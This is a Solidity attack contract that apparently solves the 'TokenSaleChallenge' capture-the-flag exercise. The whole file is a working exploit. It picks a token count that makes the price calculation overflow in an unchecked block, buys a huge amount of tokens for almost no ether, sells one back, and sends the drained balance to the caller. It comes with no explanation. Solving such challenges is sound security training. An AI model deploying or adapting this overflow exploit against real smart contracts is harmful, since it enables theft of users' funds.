// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface ITokenSaleChallenge {
    function isComplete() external view returns (bool);
    function sell(uint256 numTokens) external;
    function buy(uint256 numTokens) external payable;
}

contract TokenSaleAttack {
    ITokenSaleChallenge challenge;
    constructor(address _challenge) {
        challenge = ITokenSaleChallenge(_challenge);
    }

    function attack() external payable {
        uint value;
        uint numTokens = this.calculateNumTokens();
        unchecked {
            value = numTokens*1e18;
        }
        require(msg.value > value, "Not enought ether");
        challenge.buy{value: value}(numTokens);
        challenge.sell(1);
        payable(msg.sender).transfer(address(this).balance);
        require(challenge.isComplete(),  "Failed");
    }

    function calculateNumTokens() public pure returns (uint) {
        return (type(uint).max/1e18 + 1);
    }
    receive() external payable {}
}